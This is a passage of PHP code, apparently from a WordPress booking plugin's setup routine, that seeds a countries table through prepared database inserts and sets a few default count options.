		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Morocco",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Mozambique",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Myanmar",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Namibia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Nauru",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Nepal",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Netherlands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Netherlands Antilles",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "New Caledonia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "New Zealand",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Nicaragua",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Niger",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Nigeria",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Niue",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Norfolk Island",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Northern Mariana Islands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Norway",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Oman",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Pakistan",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Palau",
		    "0",
		    "0"		  
		) 
			
			
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Palestinian Territories",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Panama",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Papua New Guinea",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Paraguay",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Peru",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Philippines",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Pitcairn",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Poland",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Portugal",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Puerto Rico",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Qatar",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Réunion",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Romania",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Russian Federation",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Rwanda",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Saint Helena",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Saint Kitts and Nevis",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Saint Lucia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Saint Pierre and Miquelon",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Saint Vincent and the Grenadines",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Samoa",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Sao Tome and Principe",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Saudi Arabia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Senegal",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Serbia and Montenegro",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Seychelles",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Sierra Leone",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Singapore",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Slovakia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Slovenia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Solomon Islands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Somalia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "South Africa",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "South Georgia and the South Sandwich Islands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Sri Lanka",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Sudan",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Suriname",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Svalbard and Jan Mayen Islands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Swaziland",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Sweden",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Switzerland",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Syria",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Taiwan",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Tajikistan",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Tanzania",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Thailand",
		    "0",
		    "0"		  
		) 
	);
    $wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Togo",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Tokelau",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Tonga",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Trinidad and Tobago",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Tunisia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Turkey",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Turkmenistan",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Turks and Caicos Islands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Tuvalu",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Uganda",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Ukraine",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "United Arab Emirates",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "United Kingdom",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "United States of America",
		    "1",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Uruguay",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Uzbekistan",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Vanuatu",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Vatican City",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Venezuela",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Vietnam",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Virgin Islands (British)",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Virgin Islands (US)",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Wallis and Futuna Islands",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Western Sahara",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Yemen",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Zaire",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Zambia",
		    "0",
		    "0"		  
		) 
	);
	$wpdb->query
	(
		$wpdb->prepare
		(
			"INSERT INTO ". countriesTable() ."(CountryName,CountryUsed,CountryDefault)VALUES(%s, %d, %d)",
		    "Zimbabwe",
		    "0",
		    "0"		  
		) 
	);					
}
add_option( "count-employee", 2);
add_option( "count-services", 3);
add_option( "count-customer", 15);
add_option( "count-booking", 15);

?>